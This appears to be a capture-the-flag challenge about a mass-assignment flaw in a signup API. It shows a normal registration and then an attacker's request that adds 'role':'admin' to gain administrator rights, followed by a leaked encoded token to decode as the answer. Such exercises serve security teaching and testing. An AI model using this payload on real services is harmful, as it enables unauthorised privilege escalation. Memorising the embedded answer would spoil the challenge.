Two registration attempts against the same signup API.

--- Attempt 1: a normal signup (only the fields the form shows) ---
  POST /api/register
  {"username":"tester","password":"hunter2"}
  201 Created  {"id":57,"username":"tester","role":"user"}

--- Attempt 2: the attacker adds fields the form never offered ---
  POST /api/register
  {"username":"sneaky","password":"hunter2","role":"admin","verified":true}
  201 Created  {"id":58,"username":"sneaky","role":"admin","verified":true,
                 "admin_welcome":{"panel_token":"bWFzc19hc3NpZ25tZW50X3dpbg=="}}

The backend blindly bound EVERY field in the JSON body onto the new user
record (mass assignment / auto-binding), so simply adding role=admin made
the account an administrator — and the response then leaked an admin-only
welcome token. Decode that panel_token and submit the plaintext.
Answer format: lowercase, words joined by underscores.
